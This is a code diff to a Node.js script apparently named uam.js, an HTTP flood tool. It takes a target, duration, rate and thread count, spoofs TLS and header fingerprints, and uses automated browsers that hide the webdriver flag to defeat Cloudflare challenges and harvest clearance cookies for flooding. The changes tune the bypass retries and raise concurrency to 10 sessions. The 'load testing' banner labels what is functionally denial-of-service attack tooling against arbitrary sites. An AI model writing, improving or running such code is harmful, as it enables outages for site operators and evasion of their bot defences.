@@ -5,6 +5,7 @@ const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 
+
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers = "GREASE:" + [
     defaultCiphers[2],
@@ -50,6 +51,7 @@ const secureContext = tls.createSecureContext({
     secureProtocol: secureProtocol
 });
 
+
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -70,6 +72,7 @@ const language_header = [
     'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
     'en-GB,en;q=0.9'
 ];
+
 
 if (process.argv.length < 6) {
     console.log("\x1b[31mUsage: node uam.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
@@ -277,6 +280,7 @@ function flood(userAgent, cookie) {
     }
 }
 
+// Helper functions
 function randomElement(arr) {
     return arr[Math.floor(Math.random() * arr.length)];
 }
@@ -312,142 +316,136 @@ function shuffleObject(obj) {
     return shuffledObject;
 }
 
+// Cloudflare Bypass
 async function bypassCloudflareOnce(attemptNum = 1) {
-    const maxRetries = 3;
-    let finalResult = null;
+    let response = null;
+    let browser = null;
+    let page = null;
     
-    for (let retry = 0; retry < maxRetries; retry++) {
-        let response = null;
-        let browser = null;
-        let page = null;
+    try {
+        console.log(`\x1b[33mStarting bypass attempt ${attemptNum}...\x1b[0m`);
+        
+        response = await connect({
+            headless: false,
+            args: [
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-dev-shm-usage',
+                '--disable-accelerated-2d-canvas',
+                '--no-first-run',
+                '--no-zygote',
+                '--disable-gpu',
+                '--window-size=1920,1080'
+            ],
+            turnstile: true,
+            connectOption: {
+                defaultViewport: null
+            }
+        });
+        
+        browser = response.browser;
+        page = response.page;
+        
+        await page.evaluateOnNewDocument(() => {
+            Object.defineProperty(navigator, 'webdriver', {
+                get: () => undefined
+            });
+        });
+        
+        console.log(`\x1b[33mAccessing ${args.target}...\x1b[0m`);
         
         try {
-            console.log(`\x1b[33mStarting bypass attempt ${attemptNum} (retry ${retry + 1}/${maxRetries})...\x1b[0m`);
-            
-            response = await connect({
-                headless: false,
-                args: [
-                    '--no-sandbox',
-                    '--disable-setuid-sandbox',
-                    '--disable-dev-shm-usage',
-                    '--disable-accelerated-2d-canvas',
-                    '--no-first-run',
-                    '--no-zygote',
-                    '--disable-gpu',
-                    '--window-size=1920,1080'
-                ],
-                turnstile: true,
-                connectOption: {
-                    defaultViewport: null
-                }
+            await page.goto(args.target, { 
+                waitUntil: 'domcontentloaded',
+                timeout: 60000 
             });
-            
-            browser = response.browser;
-            page = response.page;
-            
-            await page.evaluateOnNewDocument(() => {
-                Object.defineProperty(navigator, 'webdriver', {
-                    get: () => undefined
-                });
-            });
-            
-            console.log(`\x1b[33mAccessing ${args.target}...\x1b[0m`);
+        } catch (navError) {
+            console.log(`\x1b[33mAccess warning: ${navError.message}\x1b[0m`);
+        }
+        
+        console.log("\x1b[33mChecking Cloudflare challenge...\x1b[0m");
+        
+        let challengeCompleted = false;
+        let checkCount = 0;
+        const maxChecks = 120;
+        
+        while (!challengeCompleted && checkCount < maxChecks) {
+            await new Promise(r => setTimeout(r, 500));
             
             try {
-                await page.goto(args.target, { 
-                    waitUntil: 'domcontentloaded',
-                    timeout: 10000 
-                });
-            } catch (navError) {
-                console.log(`\x1b[33mAccess warning: ${navError.message}\x1b[0m`);
-            }
-            
-            console.log("\x1b[33mChecking Cloudflare challenge...\x1b[0m");
-            
-            let challengeCompleted = false;
-            let checkCount = 0;
-            const maxChecks = 10;
-            
-            while (!challengeCompleted && checkCount < maxChecks) {
-                await new Promise(r => setTimeout(r, 500));
+                const cookies = await page.cookies();
+                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                 
-                try {
-                    const cookies = await page.cookies();
-                    const cfClearance = cookies.find(c => c.name === "cf_clearance");
+                if (cfClearance) {
+                    console.log(`\x1b[32mFound cookie after ${(checkCount * 0.5).toFixed(1)}s!\x1b[0m`);
+                    challengeCompleted = true;
+                    break;
+                }
+                
+                challengeCompleted = await page.evaluate(() => {
+                    const title = (document.title || "").toLowerCase();
+                    const bodyText = (document.body?.innerText || "").toLowerCase();
                     
-                    if (cfClearance) {
-                        console.log(`\x1b[32mFound cookie after ${(checkCount * 0.5).toFixed(1)}s!\x1b[0m`);
-                        challengeCompleted = true;
-                        finalResult = {
-                            cookies: cookies,
-                            userAgent: await page.evaluate(() => navigator.userAgent),
-                            cfClearance: cfClearance.value,
-                            success: true,
-                            attemptNum: attemptNum
-                        };
-                        break;
+                    if (title.includes("just a moment") || 
+                        title.includes("checking") ||
+                        bodyText.includes("checking your browser") ||
+                        bodyText.includes("please wait") ||
+                        bodyText.includes("cloudflare")) {
+                        return false;
                     }
                     
-                    challengeCompleted = await page.evaluate(() => {
-                        const title = (document.title || "").toLowerCase();
-                        const bodyText = (document.body?.innerText || "").toLowerCase();
-                        
-                        if (title.includes("just a moment") || 
-                            title.includes("checking") ||
-                            bodyText.includes("checking your browser") ||
-                            bodyText.includes("please wait") ||
-                            bodyText.includes("cloudflare")) {
-                            return false;
-                        }
-                        
-                        return document.body && document.body.children.length > 3;
-                    });
-                    
-                } catch (evalError) {
-                }
+                    return document.body && document.body.children.length > 3;
+                });
                 
-                checkCount++;
-                
-                if (checkCount % 5 === 0) {
-                    console.log(`\x1b[33mStill checking... (${(checkCount * 0.5).toFixed(1)}s elapsed)\x1b[0m`);
-                }
+            } catch (evalError) {
             }
             
-            await page.close();
-            await browser.close();
+            checkCount++;
             
-            if (finalResult) {
-                return finalResult;
-            }
-            
-            if (retry < maxRetries - 1) {
-                console.log(`\x1b[33mNo cf_clearance on retry ${retry + 1}, waiting 1s...\x1b[0m`);
-                await new Promise(r => setTimeout(r, 1000));
-            }
-            
-        } catch (error) {
-            console.log(`\x1b[31mBypass attempt ${attemptNum} (retry ${retry + 1}) failed: ${error.message}\x1b[0m`);
-            
-            try {
-                if (page) await page.close();
-                if (browser) await browser.close();
-            } catch (cleanupError) {}
-            
-            if (retry < maxRetries - 1) {
-                console.log(`\x1b[33mRetrying in 1s...\x1b[0m`);
-                await new Promise(r => setTimeout(r, 1000));
+            if (checkCount % 10 === 0) {
+                console.log(`\x1b[33mStill checking... (${(checkCount * 0.5).toFixed(1)}s elapsed)\x1b[0m`);
             }
         }
+        
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const cookies = await page.cookies();
+        console.log(`\x1b[36mFound ${cookies.length} cookies in ${(checkCount * 0.5).toFixed(1)}s\x1b[0m`);
+        
+        const cfClearance = cookies.find(c => c.name === "cf_clearance");
+        if (cfClearance) {
+            console.log(`\x1b[32mcf_clearance: ${cfClearance.value.substring(0, 30)}...\x1b[0m`);
+        }
+        
+        const userAgent = await page.evaluate(() => navigator.userAgent);
+        
+        await page.close();
+        await browser.close();
+        
+        return {
+            cookies: cookies,
+            userAgent: userAgent,
+            cfClearance: cfClearance ? cfClearance.value : null,
+            success: true,
+            attemptNum: attemptNum
+        };
+        
+    } catch (error) {
+        console.log(`\x1b[31mBypass attempt ${attemptNum} failed: ${error.message}\x1b[0m`);
+        
+        try {
+            if (page) await page.close();
+            if (browser) await browser.close();
+        } catch (cleanupError) {}
+        
+        return {
+            cookies: [],
+            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            cfClearance: null,
+            success: false,
+            attemptNum: attemptNum
+        };
     }
-    
-    console.log(`\x1b[33mAll ${maxRetries} retries failed for session ${attemptNum}, using default\x1b[0m`);
-    return {
-        cookies: [],
-        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        cfClearance: null,
-        success: true,
-        attemptNum: attemptNum
-    };
 }
 
 async function bypassCloudflareParallel(totalCount) {
@@ -457,10 +455,12 @@ async function bypassCloudflareParallel(totalCount) {
     const results = [];
     let attemptCount = 0;
     
+    const batchSize = 2;
+    
     while (results.length < totalCount) {
-        const concurrentBypassSessions = 1;
-        const remaining = totalCount - results.length;
-        const currentBatchSize = Math.min(concurrentBypassSessions, remaining);
+    const concurrentBypassSessions = 10; // Number of concurrent bypass sessions
+    const remaining = totalCount - results.length;
+    const currentBatchSize = Math.min(concurrentBypassSessions, remaining);
         
         console.log(`\n\x1b[33mStarting parallel batch (${currentBatchSize} sessions)...\x1b[0m`);
         
@@ -473,22 +473,22 @@ async function bypassCloudflareParallel(totalCount) {
         const batchResults = await Promise.all(batchPromises);
         
         for (const result of batchResults) {
-            results.push(result);
-            if (result.cfClearance) {
+            if (result.success && result.cookies.length > 0) {
+                results.push(result);
                 console.log(`\x1b[32mSession ${result.attemptNum} successful! (Total: ${results.length}/${totalCount})\x1b[0m`);
             } else {
-                console.log(`\x1b[31mSession ${result.attemptNum} no cf_clearance, proceeding without\x1b[0m`);
+                console.log(`\x1b[31mSession ${result.attemptNum} failed\x1b[0m`);
             }
         }
         
         if (results.length < totalCount) {
-            console.log(`\x1b[33mWaiting 1s before next batch...\x1b[0m`);
-            await new Promise(r => setTimeout(r, 1000));
+            console.log(`\x1b[33mWaiting 2s before next batch...\x1b[0m`);
+            await new Promise(r => setTimeout(r, 2000));
         }
     }
     
     if (results.length === 0) {
-        console.log("\x1b[33mNo sessions obtained, using default header\x1b[0m");
+        console.log("\x1b[33mNo Cloudflare cookies obtained, using default header\x1b[0m");
         results.push({
             cookies: [],
             userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -501,6 +501,7 @@ async function bypassCloudflareParallel(totalCount) {
     return results;
 }
 
+// Run flooder function
 function runFlooder() {
     const bypassInfo = randomElement(global.bypassData || []);
     if (!bypassInfo) return;
@@ -511,6 +512,7 @@ function runFlooder() {
     flood(userAgent, cookieString);
 }
 
+// Display stats
 function displayStats() {
     const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
     const remaining = Math.max(0, args.time - elapsed);
@@ -539,12 +541,14 @@ function displayStats() {
     }
 }
 
+// Initialize global stats
 global.totalRequests = 0;
 global.successRequests = 0;
 global.failedRequests = 0;
 global.startTime = Date.now();
 global.bypassData = [];
 
+// Main execution
 if (cluster.isMaster) {
     console.clear();
     console.log("\x1b[35mADVANCED LOAD TESTING\x1b[0m");
